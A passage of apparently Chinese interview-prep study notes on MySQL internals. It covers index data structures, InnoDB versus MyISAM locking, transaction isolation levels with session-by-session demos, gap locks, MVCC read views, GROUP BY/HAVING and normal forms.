href="#数据库锁的分类-">数据库锁的分类：-</a></li></ul></li><li><a href="#数据库事务的四大特性">数据库事务的四大特性</a></li><li><a href="#事务隔离级别以及各级别下并发访问问题">事务隔离级别以及各级别下并发访问问题</a><ul><li><a href="#1-更新丢失">1. 更新丢失</a></li><li><a href="#2-脏读读取未提交数据">2. 脏读（读取未提交数据）</a></li><li><a href="#3-不可重复读一个事务范围内两个相同的查询却返回了不同数据">3. 不可重复读（一个事务范围内两个相同的查询却返回了不同数据）</a><ul><li><a href="#解决方法">解决方法：</a></li></ul></li><li><a href="#4-幻读前后多次读取数据总量不一致">4. 幻读：（前后多次读取，数据总量不一致）</a></li></ul></li><li><a href="#innodb可重复读隔离级别下如何避免幻读">InnoDB可重复读隔离级别下如何避免幻读</a><ul><li><a href="#当前读">当前读</a></li><li><a href="#快照读">快照读</a><ul><li><a href="#rc级别下">RC级别下</a></li><li><a href="#在rr级别下">在RR级别下</a></li></ul></li><li><a href="#gap锁">Gap锁</a><ul><li><a href="#1-主键或者唯一键">1. 主键或者唯一键</a><ul><li><a href="#全部命中">全部命中</a></li><li><a href="#全不命中">全不命中</a></li><li><a href="#部分命中">部分命中</a></li><li><a href="#如果全命中">如果全命中</a></li></ul></li><li><a href="#非唯一索引和不走索引的当前读下">非唯一索引和不走索引的当前读下</a><ul><li><a href="#非唯一索引">非唯一索引</a></li><li><a href="#不走索引">不走索引</a></li></ul></li></ul></li></ul></li><li><a href="#rc-rr级别下的innodb的非阻塞读如何实现">RC、RR级别下的InnoDB的非阻塞读如何实现</a></li></ul></li><li><a href="#关键语法">关键语法</a><ul><li><a href="#group-by">GROUP BY</a></li><li><a href="#having">HAVING</a></li><li><a href="#countsummaxminavg">COUNT,SUM,MAX,MIN,AVG</a></li></ul></li><li><a href="#理论范式">理论范式</a><ul><li><a href="#1nf">1NF</a></li><li><a href="#2nf">2NF</a></li><li><a href="#3nf">3NF</a></li><li><a href="#其它范式">其它范式</a></li><li><a href="#优缺点">优缺点</a></li></ul></li><li><a href="#数据库连接">数据库连接</a></li></ul><!-- tocstop --><h2><span id="考点">考点：</span></h2><p>架构，索引，锁，语法，理论范式</p><h2><span id="如何设计一个关系型数据库">如何设计一个关系型数据库 √</span></h2><h3><span id="rdbms关系数据库管理系统">RDBMS：关系数据库管理系统</span></h3><p><img src="clip_image002.jpg" alt></p><h3><span id="两大部分">两大部分：</span></h3><p>​    <strong>存储部分</strong>和<strong>程序部分</strong></p><h2><span id="索引模块">索引模块</span></h2><h3><span id="为什么要使用索引">为什么要使用索引 √</span></h3><p>​    避免全表扫描去查找数据，提升检索效率</p><h3><span id="什么样的信息能成为索引">什么样的信息能成为索引 √</span></h3><p>​    主键，唯一键等能让数据<font color="red">具备一定区分性的字段</font></p><h3><span id="索引的数据结构">索引的数据结构 √</span></h3><p>​    二叉查找树，B-Tree，B+Tree（MySql），Hash结构</p><h4><span id="b-tree-">B-Tree -</span></h4><p>即遍观整棵树，子节点最多的个数是m，那么这棵树就是m阶树。</p><p><img src="clip_image002-1584950180040.jpg" alt></p><h5><span id="定义">定义</span></h5><ul><li><p>根节点至少包括两个孩子</p></li><li><p>树中每个节点最多含有m个孩子（m&gt;=2）</p></li><li><p>除根节点和叶节点外，其他每个节点至少有ceil(m/2)个孩子</p></li><li><p>所有叶子节点都位于同一层</p></li></ul><p>假设每个非终端结点中包含n个关键字信息，其中</p><p>A） Ki（i=1…n）为关键字，且关键字按顺序升序排序K(i-1)&lt;Ki</p><p>B） 关键字的个数n必须满足：[ceil(m/2)-1]&lt;=n&lt;=m-1</p><p>C） 非叶子结点的指针：P[1]，P[2]，…，P[M]；其中P[1]指向关键字小于K[1]的子树，P[M]指向关键字大于K[M-1]的子树，其它P[i]指向关键字属于（K[i-1],K[i]）的子树 </p><h4><span id="b树是b树的变体其定义与b树相同除了">B+树是B树的变体，其定义与B树相同，除了</span></h4><ul><li><p>非叶子节点的子树指针与关键字个数相同</p></li><li><p>非叶子节点的子树指针P[i]，指向关键字值[K[i],K[i+1])的子树</p></li><li><p>非叶子节点仅用来索引，数据都保存在叶子节点中</p></li><li><p>所有叶子节点均有一个链指针指向下一个叶子节点</p></li></ul><h4><span id="结论">结论 √</span></h4><ul><li><p>B+Tree更适合用来做存储索引</p></li><li><p>B+树的查询效率更加稳定</p></li><li><p>B+树更有利于对数据库的扫描 </p></li></ul><h4><span id="拓展阅读">拓展阅读</span></h4><p><a href="https://www.jianshu.com/p/7a2017e830a0" target="_blank" rel="noopener">https://www.jianshu.√com/p/7a2017e830a0</a></p><h4><span id="hash索引">Hash索引</span></h4><h5><span id="缺点">缺点：</span></h5><ul><li><p>仅仅能满足“=”，“IN”，不能使用范围查询</p></li><li><p>无法被用来避免数据的排序操作</p></li><li><p>不能利用部分索引键查询</p></li><li><p>不能避免表扫描</p></li><li><p>遇到大量Hash值相等的情况后性能并不一定就会比B-Tree索引高</p></li></ul><h4><span id="bitmap">Bitmap √</span></h4><p><img src="clip_image002-1584950246040.jpg" alt></p><p><strong>位图索引</strong>是一种使用<a href="https://baike.baidu.com/item/位图" target="_blank" rel="noopener">位图</a>的特殊数据库索引。</p><p>主要针对大量相同值的列而创建(例如：类别，操作员，部门ID,库房ID等),</p><p>索引块的一个索引行中存储键值和起止Rowid,以及这些键值的位置编码,</p><p>位置编码中的<font color="red">每一位表示键值对应的数据行的有无</font>.一个块可能指向的是几十甚至成百上千行数据的位置.</p><p><strong>适合</strong>：</p><ol><li><p>这种方式存储数据,相对于B+Tree索引,<font color="red">占用的空间非常小,创建和使用非常快</font>.</p></li><li><p>当根据键值查询时,<font color="red">可以根据起始Rowid和位图状态,快速定位数据</font>.</p></li><li><p>当根据键值做and,or或 in(x,y,..)查询时,<font color="red">直接用索引的<a href="https://baike.baidu.com/item/位图/1017781" target="_blank" rel="noopener">位图</a>进行<strong>或运算</strong>,快速得出结果行数据.</font></p></li></ol><p><strong>不适合</strong>：</p><ol><li><p>不适合键值较多的列（重复值较少的列）；</p></li><li><p>不适合update、insert、delete频繁的列，代价很高。</p></li></ol><h3><span id="密集索引和稀疏索引">密集索引和稀疏索引 √</span></h3><p>Ø 密集索引文件中的每个搜索码值都对应一个索引值</p><p>Ø 稀疏索引文件只为索引码的某些值建立索引项</p><p><img src="clip_image004.jpg" alt></p><p><strong>密集索引</strong>：叶子节点保存的不只是键值，还保存了位于<font color="red"><strong>同一行记录里的其他列的信息</strong></font>，由于密集索引决定了表的物理排列顺序，一个表只有一个物理排列顺序，所以一个表只能创建一个密集索引</p><p><strong>稀疏索引</strong>：叶子节点仅保存了<font color="red">键位信息以及该行数据的地址</font>，有的稀疏索引只保存了键位信息及其主键 </p><h3><span id="innodb">InnoDB</span></h3><p>Ø 若一个主键被定义，该主键则作为密集索引</p><p>Ø 若没有主键被定义，该表的第一个唯一非空索引则作为密集索引</p><p>Ø 若不满足以上条件，innodb内部会生成一个隐藏主键（密集索引）</p><p>Ø 非主键索引存储<font color="blue">相关键位</font>和<font color="blue">其对应的主键值</font>，包含两次查找</p><h4><span id="主键索引和非主键索引-">主键索引和非主键索引 -</span></h4><p>主键索引和非主键索引的区别是：非主键索引的叶子节点存放的是<font color="red"><strong>主键的值</strong></font>，而主键索引的叶子节点存放的是<font color="red"><strong>整行数据</strong></font>，其中非主键索引也被称为二级索引，而主键索引也被称为聚簇索引。</p><p><img src="image-20200323160333643.png" alt></p><p> <font color="red">InnoDB使用的是密集索引</font></p><ul><li><p>主键索引的B+Tree的叶子节点包含索引和数据</p><p>红色的是稀疏索引的条件筛选，需要两个步骤</p></li><li><p>第一步：在稀疏索引的B+Tree中索引该键</p></li><li><p>第二步：使用主键在主键索引B+Tree中再执行一次检索操作</p></li></ul><p><font color="red">MyISAM使用的均为稀疏索引</font></p><p>节点结构完全一致，只是存储内容不一样。<font color="red">主键索引B+Tree存储主键，辅助键B+Tree存储了辅助键。</font>索引和数据是分开存储的。通过辅助键检索无需访问主键的索引树。</p><h4><span id="聚簇索引和非聚簇索引">聚簇索引和非聚簇索引</span></h4><ul><li><p>聚簇索引：将<font color="orange"><strong>存储数据</strong></font>与<font color="blue"><strong>索引</strong></font>放到了一块，找到索引也就找到了数据</p></li><li><p>非聚簇索引：将数据存储与索引分开，索引结构的叶子节点指向了数据的对应行。</p></li></ul><h2><span id="如何定位并优化慢查询sql">如何定位并优化慢查询Sql √</span></h2><p>Ø 根据慢日志定位慢查询sql</p><p>Ø 使用explain等工具分析sql</p><p>Ø 修改sql或者尽量让sql走索引</p><h2><span id="根据慢日志定位慢查询sql">根据慢日志定位慢查询Sql</span></h2><h4><span id="显示慢查询配置信息">显示慢查询配置信息</span></h4><p><img src="clip_image002-1584950743345.jpg" alt></p><h4><span id="显示慢查询数量">显示慢查询数量</span></h4><p><img src="clip_image003.png" alt></p><p>本次回合的慢条数，重启客户端清零</p><h4><span id="打开慢日志">打开慢日志</span></h4><p><img src="clip_image004.png" alt></p><p>重启无效</p><h4><span id="设置慢查询时间阈值">设置慢查询时间阈值</span></h4><p><img src="clip_image005.png" alt></p><p>需要重新连接数据库</p><p>可以对my.ini或者my.cnf去配置，永久保存</p><h3><span id="利用explain分析sql">利用Explain分析sql</span></h3><p><img src="clip_image007.jpg" alt></p><h4><span id="type从最优到最差">Type从最优到最差</span></h4><p><img src="clip_image009.jpg" alt></p><p>红色的为全表扫描</p><h4><span id="extra">Extra</span></h4><p>Extra中出现以下2项意味着MySQL根本不能使用索引，效率会受到重大影响，应尽可能对此进行优化</p><table><thead><tr><th><strong>Etra 项</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>Using filesort</strong></td><td>表示MySQL会对结果使用一个外部索引排序，而不是从表里按索引次序读到相关内容，可能在内存或者磁盘上进行排序，MySQL中无法利用索引完成的排序操作称为“文件排序”</td></tr><tr><td><strong>Using temporary</strong></td><td>表示MySQL在对查询结果排序时使用临时表，常见于排序order by和分组查询group by</td></tr></tbody></table><h3><span id="修改sql尽量让sql走索引">修改sql尽量让sql走索引</span></h3><h4><span id="走索引">走索引</span></h4><p><img src="clip_image002-1584950929126.jpg" alt></p><p><img src="clip_image004-1584950929126.jpg" alt></p><p>Name没有走索引，而account有索引，因此我们可以将语句优化。</p><p><img src="clip_image006.jpg" alt></p><h4><span id="加索引">加索引</span></h4><p><img src="clip_image008.jpg" alt></p><h2><span id="联合索引最左匹配原则">联合索引最左匹配原则 √</span></h2><p><img src="clip_image010.jpg" alt></p><p><img src="clip_image012.jpg" alt></p><p>删除title后依然走联合索引</p><p><img src="clip_image014.jpg" alt></p><p>把area删除只留下title后就不走联合索引了</p><p>在联合索引中area在最左边</p><p>1． 最左前缀匹配原则，非常重要的原则，mysql会一直向右匹配直到遇到范围查询（&gt;、&lt;、between、like）就停止匹配，比如a=3 and b=4 and c&gt;5 and d=6，如果建立（a,b,c,d）顺序的索引，d是用不到索引的（<font color="red">c可以用到索引</font>），如果建立（a,b,d,c）的索引则都可以用到，a,b,d的顺序可以任意调整</p><p>2． =和in可以乱序，比如a=1 and b=2 and c=3 建立(a,b,c)索引可以任意顺序，mysql的查询优化器会帮你优化成索引可以识别的形式。</p><h4><span id="成因第一个字段是绝对有序的第二个字段是无序的">成因：第一个字段是绝对有序的，第二个字段是无序的。</span></h4><p>直接用第二个字段是没办法走索引的，因为它是无序的。</p><p><img src="clip_image016.jpg" alt></p><p>用column3建立b+tree，通过关键词查找alice然后排序。单靠column2无法走b+tree索引。</p><h2><span id="索引是越多越好么">索引是越多越好么 √</span></h2><p>Ø 数据量小的表不需要建立索引，建立会增加额外的索引开销</p><p>Ø 数据变更需要维护索引，因此更多的索引意味着更多的维护成本</p><p>Ø 更多的索引意味着也需要更多的空间</p><h2><span id="锁模块">锁模块</span></h2><h3><span id="二段锁">二段锁</span></h3><p><strong>两阶段的含义是指在同一个事务内，对涉及的所有数据项进行先加锁，然后才对所有的数据项解锁</strong>。</p><p><strong><em>但第一阶段加共享锁后影响了其他事务的写操作、加排它锁后影响了其他事务的读操作</em></strong>，所以较大地影响了其他事务的运行。只有第二阶段释放了所有的数据项上的锁之后，才能运行其他要操作相同数据项的事务。</p><h3><span id="myisam与innodb关于锁方面的区别">MyISAM与InnoDB关于锁方面的区别</span></h3><p>Ø MyISAM默认用的是表级锁，不支持行级锁</p><p>Ø InnoDB默认用的是行级锁，也支持表级锁</p><p>MySql客户端中一个Tab（标签页）就是一个Session</p><p><img src="clip_image018.jpg" alt></p><p>两个表除了引擎都一样</p><p>使用MyISAM引擎的时候，对一个表进行查询等操作的时候会加上数据的读锁，其他Session进行增删改的时候会加一个表级别的写锁，当读锁未被释放的时候，另外一个Session想要给表加上写锁就会被阻塞。</p><p>同理上写锁的时候没办法再上读锁，上写锁后也不能再上写锁。</p><p>如果在执行读操作后加上for update，其他读的操作也会被block。</p><p>InnoDB是二段锁，且默认打开autocommit。</p><p><img src="clip_image019.png" alt></p><p>两种方法都可以。</p><p>Set autocommit只对当前Session有用。</p><p><img src="clip_image021.jpg" alt></p><p>上共享锁后不能修改数据但是同样可以读数据（同一行）</p><p>当不走索引的时候，InnoDB也会锁住整张表，此时用表级锁。</p><p><img src="clip_image023.jpg" alt></p><p>X排他锁：增删改以及Select for update的时候。</p><p>S共享锁：读操作</p><h4><span id="myisam适合的场景">MyISAM适合的场景 √</span></h4><ul><li><p>频繁执行全表count语句</p></li><li><p>对数据进行增删改的频率不高，查询非常频繁</p></li><li><p>没有事务</p></li></ul><h4><span id="innodb适用的场景">InnoDB适用的场景 √</span></h4><ul><li><p>数据库增删改查都相当频繁</p></li><li><p>可靠性要求比较高，要求支持事务</p></li></ul><h4><span id="数据库锁的分类-">数据库锁的分类：-</span></h4><ul><li>按锁的粒度划分，可分为表级锁、行级锁、页级锁</li><li>按锁级别划分，可分为共享锁、排它锁</li><li>按加锁方式划分，可分为自动锁、显式锁</li><li>按操作划分，可分为DML锁、DDL锁</li><li>按使用方式划分，可分为乐观锁、悲观锁</li></ul><p><strong>DML(Data Manipulation Language)数据操纵语言</strong>：</p><p> 适用范围：对数据库中的数据进行一些简单操作，如insert,delete,update,select等.</p><p> <strong>DDL(Data Definition Language)数据定义语言：</strong><br> 适用范围：对数据库中的某些对象(例如，database,table)进行管理，如Create,Alter和Drop.truncate</p><p>多Session之间的互锁就是悲观锁的实现。</p><p><strong>乐观锁不使用数据库提供的锁机制</strong></p><ul><li>一般实现的两种方式：版本号和时间戳</li></ul><p>​    乐观锁加入了版本标识</p><p>​    <img src="clip_image025.jpg" alt></p><p>​    程序1：</p><p>​    <img src="clip_image027.jpg" alt></p><p>​    先执行</p><p>​    程序2：</p><p>​    <img src="clip_image029.jpg" alt></p><h3><span id="数据库事务的四大特性">数据库事务的四大特性</span></h3><p>ACID：</p><ul><li><p>原子性Atomic：<strong>事务中各项操作，要么全做要么全不做，任何一项操作的失败都会导致整个事务的失败，就像原子一样不可分割；</strong></p></li><li><p>一致性Consistency：<strong>事务结束后系统状态是一致的；事务必须始终保持系统处于一致的状态，不管在任何给定的时间并发事务有多少。</strong></p></li><li><p>隔离性Isolation：<strong>并发执行的事务彼此无法看到对方的中间状态；</strong></p></li><li><p>持久性Durability：<strong>事务完成后所做的改动都会被持久化，即使发生灾难性的失败。通过日志和同步备份可以在故障发生后重建数据。</strong></p></li></ul><h3><span id="事务隔离级别以及各级别下并发访问问题">事务隔离级别以及各级别下并发访问问题</span></h3><h4><span id="1-更新丢失">1. 更新丢失</span></h4><p>Mysql所有事务隔离级别在数据库层面上均可避免</p><p><img src="clip_image031.jpg" alt></p><h4><span id="2-脏读读取未提交数据">2. 脏读（读取未提交数据）</span></h4><p>A事务读取B事务尚未提交的数据，此时如果B事务发生错误并执行回滚操作，那么A事务读取到的数据就是脏数据。就好像原本的数据比较干净、纯粹，此时由于B事务更改了它，这个数据变得不再纯粹。这个时候A事务立即读取了这个脏数据，但事务B良心发现，又用回滚把数据恢复成原来干净、纯粹的样子，而事务A却什么都不知道，最终结果就是事务A读取了此次的脏数据，称为脏读。</p><p><img src="clip_image032.png" alt>Read-committed事务隔离级别及以上可以避免</p><p>通过</p><p><img src="clip_image033.png" alt></p><p>可以查到事务的隔离级别</p><p>设置事务隔离级别</p><p><img src="clip_image035.jpg" alt>设置成最低的事务隔离级别</p><p>然后Session1操作</p><p>’ <img src="clip_image037.jpg" alt></p><p>Session2操作</p><p><img src="clip_image039.jpg" alt></p><p>此时Session1还未提交</p><p>然后Session1进行回滚，然后再查询</p><p><img src="clip_image041.jpg" alt></p><p>金额变成1000.</p><p>但是Session2以900位底进行操作</p><p><img src="clip_image043.jpg" alt></p><p>导致金额变成了1100。</p><p>但是应该有1200的。</p><p>只需要把事务级别设置成read commited以上就可以了</p><p>然后Session1进行红框操作</p><p><img src="clip_image045.jpg" alt></p><p>然后此时Session1并未提交，然后</p><p>Session2进行查询操作</p><p><img src="clip_image047.jpg" alt></p><p>此时Session2读到的值是1100（还未修改的数据）</p><p>可以避免脏读</p><h4><span id="3-不可重复读一个事务范围内两个相同的查询却返回了不同数据">3. 不可重复读（一个事务范围内两个相同的查询却返回了不同数据）</span></h4><p>事务A在执行读取操作，由整个事务A比较大，前后读取同一条数据需要经历很长的时间 。而在事务A第一次读取数据，比如此时读取了小明的年龄为20岁，事务B执行更改操作，将小明的年龄更改为30岁，此时事务A第二次读取到小明的年龄时，发现其年龄是30岁，和之前的数据不一样了，也就是数据不重复了，系统不可以读取到重复的数据，成为不可重复读。</p><p><img src="clip_image048.png" alt></p><p>Repeatable-read事务隔离级别以上可以避免</p><p>Session1：</p><p><img src="clip_image049.png" alt></p><p>Session2：</p><p><img src="clip_image051.jpg" alt></p><p>存入数据后发现已经为1600了</p><p>此时</p><p>Session1进行读取操作</p><p><img src="clip_image053.jpg" alt></p><p>由于设置了read-committed避免了脏读，因此还是1300</p><p>然后</p><p>Session2提交修改</p><p><img src="clip_image055.jpg" alt></p><p>此时，Session1再次读取</p><p>发现balance变成了1600</p><p><img src="clip_image057.jpg" alt></p><p>这就是所谓的不可重复读，即不可重复读，是指在数据库访问中，一个<a href="https://baike.baidu.com/item/事务" target="_blank" rel="noopener">事务</a>范围内两个相同的查询却返回了不同数据。</p><h5><span id="解决方法">解决方法：</span></h5><p>将事务隔离级别改成：可重复读</p><p><img src="clip_image059.jpg" alt></p><p>然后此时：</p><p>Session1和Session2都开启事务</p><p>Session1读取账户</p><p><img src="clip_image060.png" alt></p><p>Session2：存入400</p><p><img src="clip_image062.jpg" alt></p><p>但是并未提交</p><p>此时</p><p>Session1读取</p><p><img src="clip_image064.jpg" alt></p><p>然后Session2进行提交操作</p><p>Commit</p><p>Session1再次进行查询操作</p><p><img src="clip_image066.jpg" alt></p><p>即使此时读取的是1600，但是再去做提交还是正确的</p><p><img src="clip_image068.jpg" alt></p><h4><span id="4-幻读前后多次读取数据总量不一致">4. 幻读：（前后多次读取，数据总量不一致）</span></h4><p><img src="clip_image069.png" alt></p><p>Serializable事务隔离级别可避免</p><p>Session1使用当前读读取整表数据</p><p><img src="clip_image071.jpg" alt></p><p>Session2进行插入操作</p><p><img src="clip_image073.jpg" alt></p><p>然后commit</p><p>紧接着Session1对所有余额进行更新</p><p><img src="clip_image074.png" alt></p><p>结果却更新了新插入的数据</p><p>事务在插入已经检查过不存在的记录时，惊奇的发现这些数据已经存在了，之前的检测获取到的数据如同鬼影一般。</p><p>把隔离级别改成Serializable后，所有sql操作都会加上锁，即使不加上lock in share mode；</p><p><img src="clip_image076.jpg" alt></p><h3><span id="innodb可重复读隔离级别下如何避免幻读">InnoDB可重复读隔离级别下如何避免幻读</span></h3><p>Ø 表象：快照读（非阻塞读）–伪MVCC</p><p>Ø 内在：next-key锁（行锁+gap锁）</p><h4><span id="当前读">当前读</span></h4><p>Select…lock in share mode（共享锁）, select…for update</p><p>Update, delete, insert</p><p>其余都是加上排他锁</p><p>读取的是记录的最新版本，并且读取后还需保证其他并发事务不能修改当前事务，对读取的事务加锁。</p><p><img src="clip_image078.jpg" alt></p><h4><span id="快照读">快照读</span></h4><p>不加锁的非阻塞读，select（不在Serializable级别下才成立）</p><p>在Serializable下是串行读，所以快照读退化成当前读。</p><h5><span id="rc级别下">RC级别下</span></h5><p>Session1：（RC）</p><p><img src="clip_image079.png" alt></p><p>Session2中</p><p><img src="clip_image081.jpg" alt></p><p>在Session1中用当前读:</p><p><img src="clip_image083.jpg" alt></p><p>快照读</p><p><img src="clip_image084.png" alt></p><p>快照读已经为600</p><p><strong>在RC下，快照读和当前读的效果是一样的</strong></p><h5><span id="在rr级别下">在RR级别下</span></h5><p>在Session3中先使用快照读</p><p><img src="clip_image086.jpg" alt></p><p><img src="clip_image087.png" alt></p><p>在Session4中将余额改成300</p><p><img src="clip_image089.jpg" alt></p><p>Session3当前读：</p><p><img src="clip_image091.jpg" alt></p><p>更新成300</p><p>快照读：</p><p><img src="clip_image093.jpg" alt></p><p>快照读还是600</p><p>有没有可能在快照读下读到最新的数据呢？ 可以！</p><p>在Session3中先不做查询，先在Session4中对balance更新</p><p><img src="clip_image095.jpg" alt></p><p>然后在Session3中使用当前读和快照读都是0</p><h4><span id="gap锁">Gap锁</span></h4><p>Gap是索引树中插入数据的空隙，gap lock锁定一个范围，但是不包括数据本身。</p><p>目的是为了防止同一事务的两次当前读出现幻读的情况。</p><p>在RR和Serializable下都默认支持Gap锁</p><h5><span id="1-主键或者唯一键">1. 主键或者唯一键</span></h5><p>在RR下无论删改查当前读若用到主键或者唯一键会用到gap锁吗？</p><p>Ø 如果where条件全部命中，则不会用Gap锁，只会加记录锁</p><p>全部命中即精确查询，全部条件都在数据库中存在。</p><p>由于全部命中，不会出现幻读情况。就不需要加Gap锁。（因为新增的数据肯定在where范围之外，（where里面是唯一键或者主键））</p><p><img src="clip_image096.png" alt></p><p>由于id是唯一键。因此delete会走id这列的索引进行where条件的过滤。</p><p>在找到id=9的记录会将id=9的数据加上行锁(record lock),会根据读到的name作为主键索引，即密集索引，然后将name=d对应的主键索引项也加上record lock（排他锁）。</p><p><strong>为什么将主键索引也加锁呢</strong></p><p>如果此时有其他事务更新name=d的id为90，由于没有锁，该事务无法感知此次更新，违背了同一记录上的更新或者删除需要串行执行的约束。</p><p>创建tb表</p><p><img src="clip_image097.png" alt></p><p>其中ID为4 、7 和 8的数据不存在</p><p><img src="clip_image098.png" alt></p><p>此时两个Session的事务隔离级别均为RR</p><h6><span id="全部命中">全部命中</span></h6><p>Session1：</p><p><img src="clip_image099.png" alt></p><p>怎么证明是走唯一索引呢？用explain</p><p><img src="clip_image101.jpg" alt></p><p>如果有gap锁的话9周围的间隙将被锁起来</p><p>如果在别的事务中加入id=10的数据是会被Blocked住</p><p>在Session1未提交时</p><p>Session2：</p><p><img src="clip_image102.png" alt></p><p>执行成功，因为不加gap锁。</p><p>Ø 如果where条件部分命中或者全不命中，则会加Gap锁</p><h6><span id="全不命中">全不命中</span></h6><p>我们只需要删除一个不存在的记录即可（我们在Session1删除7，Session2插入8试试看）</p><p><strong>在Session1：</strong></p><p>删除不存在的值</p><p><img src="clip_image103.png" alt></p><p><strong>Session2：</strong></p><p>插入不存在的值</p><p><img src="clip_image104.png" alt></p><p>然后被blocked</p><h6><span id="部分命中">部分命中</span></h6><p>Session1：</p><p><img src="clip_image105.png" alt></p><p><img src="clip_image106.png" alt></p><p>Session1未提交时</p><p>Session2进行插入操作</p><p><img src="clip_image107.png" alt></p><p>插入4成功了，小于5的数据并未加锁</p><p>（插入5到9的数据会被锁住）</p><p>插入7的时候被blocked住了</p><p>插入8也被锁住</p><p>插入10就没被锁住</p><h6><span id="如果全命中">如果全命中</span></h6><p>Session1</p><p><img src="clip_image109.jpg" alt></p><p>此时Session2插入7和8均成功执行（不加Gap锁）</p><p><img src="clip_image111.jpg" alt></p><p>Gap范围有那么多，但是只会对(6,9] (9,11]的gap上锁</p><p>Gap锁锁住左开右闭的区间</p><p><img src="clip_image113.jpg" alt></p><p>Gap锁是用来防止插入的</p><p>如图会对(6-9] (9-11]gap区间上锁</p><p><strong>但是还要考虑主键的值才能最终判断。</strong></p><h5><span id="非唯一索引和不走索引的当前读下">非唯一索引和不走索引的当前读下</span></h5><h6><span id="非唯一索引">非唯一索引</span></h6><p>创建表</p><p><img src="clip_image114.png" alt></p><p><strong>和图中的案例是一致的，gap锁锁住(6,9] (9,11]</strong></p><p><img src="clip_image115.png" alt></p><p>Session1：</p><p><img src="clip_image116.png" alt></p><p>Session2：</p><p><img src="clip_image117.png" alt></p><p>需要等待Session1提交或者回滚</p><p>此时插入5 7 12的情况：</p><p>5成功</p><p>7失败</p><p>12成功</p><p>临界情况</p><p>插入6和11</p><p>我们可以看到此时表里id为6的行的name的值为c</p><p><img src="clip_image118.png" alt></p><p>根据字母表顺序b&lt;c&lt;d</p><p><img src="clip_image119.png" alt></p><p>插入成功</p><p>插入主键为dd，id为6的值失败</p><p><img src="clip_image121.jpg" alt></p><p>由于主键bb按字母顺序不在6-11内因此没有被blocked</p><p>相反 dd在6-11内因此被blokced</p><h6><span id="不走索引">不走索引</span></h6><p><img src="clip_image122.png" alt></p><p>所有gap均被锁住</p><p>创建表</p><p><img src="clip_image123.png" alt>c</p><p><img src="clip_image124.png" alt></p><p>Session1:</p><p><img src="clip_image125.png" alt></p><p>Session2:</p><p><img src="clip_image127.jpg" alt></p><h3><span id="rc-rr级别下的innodb的非阻塞读如何实现">RC、RR级别下的InnoDB的非阻塞读如何实现</span></h3><p>Ø 数据行里的DB_TRX_ID、DB_ROLL_PTR、DB_ROW_ID字段</p><p><em>第一个是事务ID，第二个是rollback指针，第三个是行号（可以作为隐藏主键（如果没有主键和唯一键）），此外还有其他标志，比如说删除一行数据不是真的将其删除，而是将删除的标志位更改。</em></p><p>Ø Undo日志</p><p><em>存储老版数据</em></p><p>Ø Read view</p><p><img src="clip_image129.jpg" alt></p><p>分为Insert Undo log和update undo log</p><p>Insert Undo log事务对insert产生的undo log，只在事务回滚的时候需要，并且在事务提交的时候丢弃。</p><p>Update undo log，事务delete和update产生的undo log，不仅在回滚的时候需要，快照读的时候也需要所以不能随便删除，只有在快照中不涉及该记录该日志才会被xx线程删除。</p><p>Read view主要做可见性判断的</p><p>当我们执行快照读Select的时候，针对我们查询的数据，创建出一个read view来决定当前事务能看到的是哪个版本的数据。Read view 遵循一个可见性算法，将数据的DB_TRX_ID数据取出来与系统其它活跃事务id做对比，如果大于或者等于这些id的话就通过db_roll_ptr指针去取出undo log上一层的DB_TRX_ID直到小于这些活跃事务id为止。这样就保证我们获取数据的版本是最稳定的版本。（越新开启的事务，它的ID是越大的）</p><p>在RR级别下Session在start transaction之后的第一条快照读后创建一个快照即read view会将当前系统中活跃的事务记录起来，此后调用快照读的话还是调用同一个read view。</p><p>在RC级别下，事务中每条Select语句每次都会创建一次新的快照</p><p>读取事务时候的非阻塞就是MVCC（多版本并发控制）</p><p>InnoDB的非阻塞读机制是伪MVCC（读写不冲突），并没有实现多版本共存，undo log内容只是串行化的结果，记录多个事务过程不属于多版本共存。</p><h2><span id="关键语法">关键语法</span></h2><h4><span id="group-by">GROUP BY</span></h4><p>满足Select字句中的列名必须为分组列或列函数（只对一张表成立）</p><p>列函数对于group by字句定义的每个组各返回一个结果</p><p><img src="clip_image002-1584950982263.jpg" alt></p><p><img src="clip_image004-1584950982263.jpg" alt></p><p><img src="clip_image006-1584950982264.jpg" alt> </p><p><img src="image-20200323162145595.png" alt></p><p>查询所有同学的学号，课程数，总成绩</p><p><img src="clip_image009.png" alt></p><p><img src="clip_image011.jpg" alt></p><p>Where一定要在group by前面</p><h4><span id="having">HAVING</span></h4><p>Ø 通常与GROUP BY子句一起使用</p><p>Ø WHERE过滤行，HAVING过滤组</p><p>Ø 出现在同一sql的顺序：WHERE-&gt;GROUP BY-&gt;HAVING</p><p><img src="clip_image012.png" alt></p><p><img src="clip_image013.png" alt></p><h4><span id="countsummaxminavg">COUNT,SUM,MAX,MIN,AVG</span></h4><h2><span id="理论范式">理论范式</span></h2><p><img src="clip_image015.jpg" alt="范式"></p><h3><span id="1nf">1NF</span></h3><p>是指在<a href="https://baike.baidu.com/item/关系模型" target="_blank" rel="noopener">关系模型</a>中，对于添加的一个规范要求，所有的域都应该是原子性的，即数据库表的每一列都是不可分割的原子数据项，而不能是集合，数组，记录等非原子数据项。即实体中的某个属性有多个值时，必须拆分为不同的属性。在符合第一范式（1NF）表中的每个域值只能是实体的一个属性或一个属性的一部分。简而言之，<strong>第一范式就是无重复的域</strong>(<strong>原子项)</strong>。</p><p>1NF是关系模式应具备的最起码的条件，如果数据库设计不能满足第一范式，就不能称为关系型数据库。关系数据库设计研究的关系规范化是在1NF之上进行的。</p><h3><span id="2nf">2NF</span></h3><p>第二范式要满足的条件：<font color="red">首先要满足第一范式，其次每一个非主属性要完全函数依赖于候选键，或者是主键。</font>也就是说，每个非主属性是由整个主键函数决定的，而不能有主键的一部分来决定。</p><h3><span id="3nf">3NF</span></h3><p>如果关系模式R是2NF，且关系模式R（U,F）中的所有非主属性对任何候选关键字都不存在传递依赖，则称关系R是属于第三范式。</p><p>第三范式（3NF）；符合2NF，并且，消除传递依赖。</p><h3><span id="其它范式">其它范式</span></h3><p>第四范式：要求把同一表内的多对多关系删除。</p><p>第五范式：从最终结构重新建立原始结构。</p><p>BC范式（BCNF）：符合3NF，并且，主属性不依赖于主属性。若关系模式R属于第一范式，且每个属性都不传递依赖于键码，则R属于BC范式。</p><h3><span 